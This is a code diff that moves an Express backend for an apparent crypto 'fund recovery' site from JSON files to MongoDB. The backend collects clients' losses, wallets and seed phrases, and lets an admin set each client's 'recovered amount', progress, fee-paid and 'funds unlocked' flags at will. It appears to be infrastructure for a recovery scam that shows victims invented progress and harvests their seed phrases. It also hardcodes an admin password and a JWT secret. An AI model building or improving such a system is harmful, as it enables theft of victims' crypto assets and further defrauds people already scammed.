@@ -2,51 +2,88 @@ import express from 'express';
 import cors from 'cors';
 import jwt from 'jsonwebtoken';
 import bcrypt from 'bcryptjs';
-import fs from 'fs';
-import path from 'path';
-import { fileURLToPath } from 'url';
+import mongoose from 'mongoose';
+import dotenv from 'dotenv';
 
-const __filename = fileURLToPath(import.meta.url);
-const __dirname = path.dirname(__filename);
+dotenv.config();
 
 const app = express();
 const PORT = process.env.PORT || 5000;
-const JWT_SECRET = 'vaulttrace-secret-key-2024';
+const JWT_SECRET = process.env.JWT_SECRET || 'vaulttrace-secret-key-2024';
+const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://127.0.0.1:27017/vaulttrace';
+
+mongoose.set('strictQuery', false);
+mongoose
+  .connect(MONGODB_URI)
+  .then(() => console.log(`Connected to MongoDB at ${MONGODB_URI}`))
+  .catch((error) => {
+    console.error('MongoDB connection error:', error);
+    process.exit(1);
+  });
+
+const clientSchema = new mongoose.Schema(
+  {
+    name: { type: String, required: true },
+    email: { type: String, required: true, unique: true },
+    password: { type: String, required: true },
+    description: String,
+    evidence: String,
+    amountLost: { type: Number, default: 0 },
+    data: {
+      recoveredAmount: { type: Number, default: 0 },
+      trackingProgress: { type: Number, default: 0 },
+      feePaid: { type: Boolean, default: false },
+      paymentPending: { type: Boolean, default: false },
+      paymentConfirmed: { type: Boolean, default: false },
+      fundsUnlocked: { type: Boolean, default: false },
+      balance: { type: Number, default: 0 },
+      fixed: { type: Number, default: 0 },
+      marsettaShare: { type: Number, default: 0 },
+      verifiedLoss1: { type: Number, default: 0 },
+      verifiedLoss2: { type: Number, default: 0 },
+      totalEntitlement: { type: Number, default: 0 },
+    },
+    wallet: { type: String, default: '' },
+    seedPhrase: { type: String, default: '' },
+  },
+  {
+    timestamps: true,
+    toJSON: { virtuals: true },
+    toObject: { virtuals: true },
+  }
+);
+
+clientSchema.virtual('id').get(function () {
+  return this._id.toHexString();
+});
+
+const messageSchema = new mongoose.Schema(
+  {
+    from: { type: String, enum: ['Admin', 'Client'], required: true },
+    message: { type: String, required: true },
+    time: { type: Date, default: Date.now },
+    clientEmail: { type: String, required: true },
+    clientId: { type: mongoose.Schema.Types.ObjectId, ref: 'Client', required: true },
+    adminReply: { type: String, default: null },
+    adminReplyTime: { type: Date, default: null },
+  },
+  {
+    timestamps: true,
+    toJSON: { virtuals: true },
+    toObject: { virtuals: true },
+  }
+);
+
+messageSchema.virtual('id').get(function () {
+  return this._id.toHexString();
+});
+
+const Client = mongoose.model('Client', clientSchema);
+const Message = mongoose.model('Message', messageSchema);
 
 // Middleware
 app.use(cors());
 app.use(express.json());
-
-// Data storage paths
-const DATA_DIR = path.join(__dirname, '..', 'data');
-const CLIENTS_FILE = path.join(DATA_DIR, 'clients.json');
-const MESSAGES_FILE = path.join(DATA_DIR, 'messages.json');
-const UPLOADS_DIR = path.join(__dirname, '..', 'public', 'uploads');
-
-// Ensure directories exist
-if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR);
-if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR, { recursive: true });
-
-// Helper functions
-const readData = (filePath) => {
-  try {
-    if (fs.existsSync(filePath)) {
-      return JSON.parse(fs.readFileSync(filePath, 'utf8'));
-    }
-    return [];
-  } catch (error) {
-    console.error(`Error reading ${filePath}:`, error);
-    return [];
-  }
-};
-
-const writeData = (filePath, data) => {
-  try {
-    fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
-  } catch (error) {
-    console.error(`Error writing ${filePath}:`, error);
-  }
-};
 
 // Authentication middleware
 const authenticateToken = (req, res, next) => {
@@ -70,88 +107,76 @@ const authenticateToken = (req, res, next) => {
 
 // Client registration
 app.post('/api/register', async (req, res) => {
-  const { name, email, password, description, evidence, amountLost } = req.body;
+  try {
+    const { name, email, password, description, evidence, amountLost } = req.body;
 
-  const clients = readData(CLIENTS_FILE);
-  const existingClient = clients.find((c) => c.email === email);
+    const existingClient = await Client.findOne({ email });
+    if (existingClient) {
+      return res.status(400).json({ message: 'Email already registered' });
+    }
 
-  if (existingClient) {
-    return res.status(400).json({ message: 'Email already registered' });
+    const hashedPassword = await bcrypt.hash(password, 10);
+    await Client.create({
+      name,
+      email,
+      password: hashedPassword,
+      description,
+      evidence,
+      amountLost: amountLost || 0,
+      data: {
+        verifiedLoss1: amountLost || 0,
+      },
+    });
+
+    res.status(201).json({ message: 'Registration successful' });
+  } catch (error) {
+    console.error('Registration error:', error);
+    res.status(500).json({ message: 'Registration failed' });
   }
-
-  const hashedPassword = await bcrypt.hash(password, 10);
-  const newClient = {
-    id: Date.now().toString(),
-    name,
-    email,
-    password: hashedPassword,
-    description,
-    evidence,
-    createdAt: new Date().toISOString(),
-    data: {
-      recoveredAmount: 0,
-      trackingProgress: 0,
-      feePaid: false,
-      paymentPending: false,
-      paymentConfirmed: false,
-      fundsUnlocked: false,
-      balance: 0,
-      fixed: 0,
-      marsettaShare: 0,
-      verifiedLoss1: amountLost || 0,
-      verifiedLoss2: 0,
-      totalEntitlement: 0,
-    },
-    wallet: '',
-    seedPhrase: '',
-  };
-
-  clients.push(newClient);
-  writeData(CLIENTS_FILE, clients);
-
-  res.status(201).json({ message: 'Registration successful' });
 });
 
 // Client login
 app.post('/api/login', async (req, res) => {
-  const { email, password } = req.body;
+  try {
+    const { email, password } = req.body;
+    const client = await Client.findOne({ email });
 
-  const clients = readData(CLIENTS_FILE);
-  const client = clients.find((c) => c.email === email);
-
-  if (!client) {
-    return res.status(400).json({ message: 'Invalid credentials' });
-  }
-
-  const validPassword = await bcrypt.compare(password, client.password);
-  if (!validPassword) {
-    return res.status(400).json({ message: 'Invalid credentials' });
-  }
-
-  const token = jwt.sign(
-    { id: client.id, email: client.email, role: 'client' },
-    JWT_SECRET,
-    { expiresIn: '24h' }
-  );
-
-  res.json({
-    token,
-    user: {
-      id: client.id,
-      name: client.name,
-      email: client.email,
-      role: 'client'
+    if (!client) {
+      return res.status(400).json({ message: 'Invalid credentials' });
     }
-  });
+
+    const validPassword = await bcrypt.compare(password, client.password);
+    if (!validPassword) {
+      return res.status(400).json({ message: 'Invalid credentials' });
+    }
+
+    const token = jwt.sign(
+      { id: client.id, email: client.email, role: 'client' },
+      JWT_SECRET,
+      { expiresIn: '24h' }
+    );
+
+    res.json({
+      token,
+      user: {
+        id: client.id,
+        name: client.name,
+        email: client.email,
+        role: 'client',
+      },
+    });
+  } catch (error) {
+    console.error('Login error:', error);
+    res.status(500).json({ message: 'Login failed' });
+  }
 });
 
 // Admin login
 app.post('/api/admin/login', async (req, res) => {
   const { email, password } = req.body;
 
-  // Simple admin credentials (in production, store in database)
-  const adminEmail = 'support@vaulttrace.com';
-  const adminPassword = '@Vaulttrace081';
+  const adminEmail = process.env.ADMIN_EMAIL || 'support@vaulttrace.com';
+  const adminPassword = process.env.ADMIN_PASSWORD || '@Vaulttrace081';
 
   if (email !== adminEmail || password !== adminPassword) {
     return res.status(400).json({ message: 'Invalid admin credentials' });
@@ -167,201 +192,255 @@ app.post('/api/admin/login', async (req, res) => {
     token,
     user: {
       email: adminEmail,
-      role: 'admin'
-    }
+      role: 'admin',
+    },
   });
 });
 
 // Get all clients (admin only)
-app.get('/api/admin/clients', authenticateToken, (req, res) => {
+app.get('/api/admin/clients', authenticateToken, async (req, res) => {
   if (req.user.role !== 'admin') {
     return res.status(403).json({ message: 'Admin access required' });
   }
 
-  const clients = readData(CLIENTS_FILE);
-  const clientList = clients.map((c) => ({
-    id: c.id,
-    name: c.name,
-    email: c.email,
-    createdAt: c.createdAt,
-  }));
+  try {
+    const clients = await Client.find({}, 'name email createdAt').lean({ virtuals: true });
+    const clientList = clients.map((c) => ({
+      id: c.id,
+      name: c.name,
+      email: c.email,
+      createdAt: c.createdAt,
+    }));
 
-  res.json(clientList);
+    res.json(clientList);
+  } catch (error) {
+    console.error('Fetch clients error:', error);
+    res.status(500).json({ message: 'Failed to fetch clients' });
+  }
 });
 
 // Get client data
-app.get('/api/client/data', authenticateToken, (req, res) => {
-  const clients = readData(CLIENTS_FILE);
-  const client = clients.find((c) => c.id === req.user.id);
+app.get('/api/client/data', authenticateToken, async (req, res) => {
+  try {
+    const client = await Client.findById(req.user.id);
+    if (!client) {
+      return res.status(404).json({ message: 'Client not found' });
+    }
 
-  if (!client) {
-    return res.status(404).json({ message: 'Client not found' });
+    res.json(client);
+  } catch (error) {
+    console.error('Fetch client data error:', error);
+    res.status(500).json({ message: 'Failed to fetch client data' });
   }
-
-  res.json(client);
 });
 
 // Update client data (admin only)
-app.put('/api/admin/client/:id', authenticateToken, (req, res) => {
+app.put('/api/admin/client/:id', authenticateToken, async (req, res) => {
   if (req.user.role !== 'admin') {
     return res.status(403).json({ message: 'Admin access required' });
   }
 
-  const clients = readData(CLIENTS_FILE);
-  const clientIndex = clients.findIndex((c) => c.id === req.params.id);
+  try {
+    const client = await Client.findById(req.params.id);
+    if (!client) {
+      return res.status(404).json({ message: 'Client not found' });
+    }
 
-  if (clientIndex === -1) {
-    return res.status(404).json({ message: 'Client not found' });
+    client.data = { ...client.data, ...req.body };
+    await client.save();
+
+    res.json({ message: 'Client data updated successfully' });
+  } catch (error) {
+    console.error('Update client error:', error);
+    res.status(500).json({ message: 'Failed to update client data' });
   }
-
-  clients[clientIndex].data = { ...clients[clientIndex].data, ...req.body };
-  writeData(CLIENTS_FILE, clients);
-
-  res.json({ message: 'Client data updated successfully' });
 });
 
 // Get selected client data (admin only)
-app.get('/api/admin/client/:id', authenticateToken, (req, res) => {
+app.get('/api/admin/client/:id', authenticateToken, async (req, res) => {
   if (req.user.role !== 'admin') {
     return res.status(403).json({ message: 'Admin access required' });
   }
 
-  const clients = readData(CLIENTS_FILE);
-  const client = clients.find((c) => c.id === req.params.id);
+  try {
+    const client = await Client.findById(req.params.id);
+    if (!client) {
+      return res.status(404).json({ message: 'Client not found' });
+    }
 
-  if (!client) {
-    return res.status(404).json({ message: 'Client not found' });
+    res.json(client);
+  } catch (error) {
+    console.error('Fetch selected client error:', error);
+    res.status(500).json({ message: 'Failed to fetch client data' });
   }
-
-  res.json(client);
 });
 
 // Update client wallet/seed
-app.put('/api/client/wallet', authenticateToken, (req, res) => {
-  const { wallet, seedPhrase } = req.body;
-  const clients = readData(CLIENTS_FILE);
-  const clientIndex = clients.findIndex((c) => c.id === req.user.id);
+app.put('/api/client/wallet', authenticateToken, async (req, res) => {
+  try {
+    const { wallet, seedPhrase } = req.body;
+    const client = await Client.findById(req.user.id);
 
-  if (clientIndex === -1) {
-    return res.status(404).json({ message: 'Client not found' });
+    if (!client) {
+      return res.status(404).json({ message: 'Client not found' });
+    }
+
+    client.wallet = wallet;
+    client.seedPhrase = seedPhrase;
+    await client.save();
+
+    res.json({ message: 'Wallet data updated successfully' });
+  } catch (error) {
+    console.error('Update wallet error:', error);
+    res.status(500).json({ message: 'Failed to update wallet data' });
   }
-
-  clients[clientIndex].wallet = wallet;
-  clients[clientIndex].seedPhrase = seedPhrase;
-  writeData(CLIENTS_FILE, clients);
-
-  res.json({ message: 'Wallet data updated successfully' });
 });
 
 // Change password
 app.put('/api/client/password', authenticateToken, async (req, res) => {
-  const { currentPassword, newPassword } = req.body;
-  const clients = readData(CLIENTS_FILE);
-  const clientIndex = clients.findIndex((c) => c.id === req.user.id);
+  try {
+    const { currentPassword, newPassword } = req.body;
+    const client = await Client.findById(req.user.id);
 
-  if (clientIndex === -1) {
-    return res.status(404).json({ message: 'Client not found' });
+    if (!client) {
+      return res.status(404).json({ message: 'Client not found' });
+    }
+
+    const validPassword = await bcrypt.compare(currentPassword, client.password);
+    if (!validPassword) {
+      return res.status(400).json({ message: 'Current password is incorrect' });
+    }
+
+    client.password = await bcrypt.hash(newPassword, 10);
+    await client.save();
+
+    res.json({ message: 'Password changed successfully' });
+  } catch (error) {
+    console.error('Password change error:', error);
+    res.status(500).json({ message: 'Failed to change password' });
   }
-
-  const client = clients[clientIndex];
-  const validPassword = await bcrypt.compare(currentPassword, client.password);
-
-  if (!validPassword) {
-    return res.status(400).json({ message: 'Current password is incorrect' });
-  }
-
-  const hashedPassword = await bcrypt.hash(newPassword, 10);
-  clients[clientIndex].password = hashedPassword;
-  writeData(CLIENTS_FILE, clients);
-
-  res.json({ message: 'Password changed successfully' });
 });
 
 // Update client verified loss 2 (additional evidence)
-app.put('/api/client/verified-loss-2', authenticateToken, (req, res) => {
-  const { amount } = req.body;
-  const clients = readData(CLIENTS_FILE);
-  const clientIndex = clients.findIndex((c) => c.id === req.user.id);
+app.put('/api/client/verified-loss-2', authenticateToken, async (req, res) => {
+  try {
+    const { amount } = req.body;
+    const client = await Client.findById(req.user.id);
 
-  if (clientIndex === -1) {
-    return res.status(404).json({ message: 'Client not found' });
+    if (!client) {
+      return res.status(404).json({ message: 'Client not found' });
+    }
+
+    client.data.verifiedLoss2 = amount || 0;
+    await client.save();
+
+    res.json({ message: 'Verified loss 2 updated successfully' });
+  } catch (error) {
+    console.error('Verified loss update error:', error);
+    res.status(500).json({ message: 'Failed to update verified loss' });
   }
-
-  clients[clientIndex].data.verifiedLoss2 = amount || 0;
-  writeData(CLIENTS_FILE, clients);
-
-  res.json({ message: 'Verified loss 2 updated successfully' });
 });
 
 // Send support message
-app.post('/api/messages', authenticateToken, (req, res) => {
-  const { message } = req.body;
-  const messages = readData(MESSAGES_FILE);
+app.post('/api/messages', authenticateToken, async (req, res) => {
+  try {
+    const { message, clientId: adminClientId } = req.body;
+    let targetClientId = req.user.id;
+    let targetClientEmail = req.user.email;
+    let from = 'Client';
 
-  const newMessage = {
-    id: Date.now().toString(),
-    from: req.user.role === 'admin' ? 'Admin' : 'Client',
-    message,
-    time: new Date().toISOString(),
-    clientEmail: req.user.email,
-    clientId: req.user.id,
-    adminReply: null,
-    adminReplyTime: null,
-  };
+    if (req.user.role === 'admin') {
+      if (!adminClientId) {
+        return res.status(400).json({ message: 'Client ID is required for admin messages' });
+      }
+      targetClientId = adminClientId;
+      from = 'Admin';
+      const client = await Client.findById(adminClientId);
+      if (!client) {
+        return res.status(404).json({ message: 'Client not found' });
+      }
+      targetClientEmail = client.email;
+    }
 
-  messages.push(newMessage);
-  writeData(MESSAGES_FILE, messages);
+    await Message.create({
+      from,
+      message,
+      clientEmail: targetClientEmail,
+      clientId: targetClientId,
+    });
 
-  res.status(201).json({ message: 'Message sent successfully' });
+    res.status(201).json({ message: 'Message sent successfully' });
+  } catch (error) {
+    console.error('Send message error:', error);
+    res.status(500).json({ message: 'Failed to send message' });
+  }
 });
 
-// Get messages for client
-app.get('/api/messages', authenticateToken, (req, res) => {
-  const messages = readData(MESSAGES_FILE);
-  const clientMessages = messages.filter((m) =>
-    m.clientId === req.user.id || (req.user.role === 'admin' && m.clientEmail === req.query.clientEmail)
-  );
+// Get messages for client or admin
+app.get('/api/messages', authenticateToken, async (req, res) => {
+  try {
+    let filter;
 
-  res.json(clientMessages);
+    if (req.user.role === 'admin') {
+      if (!req.query.clientEmail) {
+        return res.status(400).json({ message: 'Client email is required for admin message queries' });
+      }
+      filter = { clientEmail: req.query.clientEmail };
+    } else {
+      filter = { clientId: req.user.id };
+    }
+
+    const messages = await Message.find(filter).lean({ virtuals: true });
+    res.json(messages);
+  } catch (error) {
+    console.error('Fetch messages error:', error);
+    res.status(500).json({ message: 'Failed to fetch messages' });
+  }
 });
 
 // Reply to message (admin only)
-app.put('/api/messages/:id/reply', authenticateToken, (req, res) => {
+app.put('/api/messages/:id/reply', authenticateToken, async (req, res) => {
   if (req.user.role !== 'admin') {
     return res.status(403).json({ message: 'Admin access required' });
   }
 
-  const { reply } = req.body;
-  const messages = readData(MESSAGES_FILE);
-  const messageIndex = messages.findIndex((m) => m.id === req.params.id);
+  try {
+    const { reply } = req.body;
+    const message = await Message.findById(req.params.id);
 
-  if (messageIndex === -1) {
-    return res.status(404).json({ message: 'Message not found' });
+    if (!message) {
+      return res.status(404).json({ message: 'Message not found' });
+    }
+
+    message.adminReply = reply;
+    message.adminReplyTime = new Date();
+    await message.save();
+
+    res.json({ message: 'Reply sent successfully' });
+  } catch (error) {
+    console.error('Reply message error:', error);
+    res.status(500).json({ message: 'Failed to send reply' });
   }
-
-  messages[messageIndex].adminReply = reply;
-  messages[messageIndex].adminReplyTime = new Date().toISOString();
-  writeData(MESSAGES_FILE, messages);
-
-  res.json({ message: 'Reply sent successfully' });
 });
 
 // Delete client (admin only)
-app.delete('/api/admin/client/:id', authenticateToken, (req, res) => {
+app.delete('/api/admin/client/:id', authenticateToken, async (req, res) => {
   if (req.user.role !== 'admin') {
     return res.status(403).json({ message: 'Admin access required' });
   }
 
-  const clients = readData(CLIENTS_FILE);
-  const filteredClients = clients.filter((c) => c.id !== req.params.id);
-  writeData(CLIENTS_FILE, filteredClients);
+  try {
+    const deletedClient = await Client.findByIdAndDelete(req.params.id);
+    if (!deletedClient) {
+      return res.status(404).json({ message: 'Client not found' });
+    }
 
-  // Also remove messages for this client
-  const messages = readData(MESSAGES_FILE);
-  const filteredMessages = messages.filter((m) => m.clientId !== req.params.id);
-  writeData(MESSAGES_FILE, filteredMessages);
-
-  res.json({ message: 'Client deleted successfully' });
+    await Message.deleteMany({ clientId: req.params.id });
+    res.json({ message: 'Client deleted successfully' });
+  } catch (error) {
+    console.error('Delete client error:', error);
+    res.status(500).json({ message: 'Failed to delete client' });
+  }
 });
 
 app.listen(PORT, () => {
